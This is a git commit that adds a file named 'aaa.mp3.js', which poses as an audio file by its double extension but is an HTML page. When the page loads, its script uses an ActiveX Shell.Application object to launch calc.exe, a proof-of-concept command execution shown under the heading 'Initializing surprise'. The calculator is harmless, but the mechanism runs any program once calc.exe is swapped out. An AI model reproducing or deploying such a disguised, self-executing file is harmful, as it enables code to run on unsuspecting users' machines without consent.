a3893ed43da8e028776d238e6e9ad88e0442b111
emircuneyt01 <69259010+emircuneyt01@users.noreply.github.com>
2021-06-09 12:39:25 +0300

    Create aaa.mp3.js

---
+++ aaa.mp3.js
@@ -0,0 +1,11 @@
+<html>
+	<head>
+	</head>
+	<body style="background-color: white;" >
+		<h1>Initializing surprise in 3, 2, 1</h1>
+		<script>
+			var oShell = new ActiveXObject("Shell.Application");
+      oShell.ShellExecute("C:\\Windows\\system32\\calc.exe","","","open","1");
+		</script>
+	</body>
+</html>
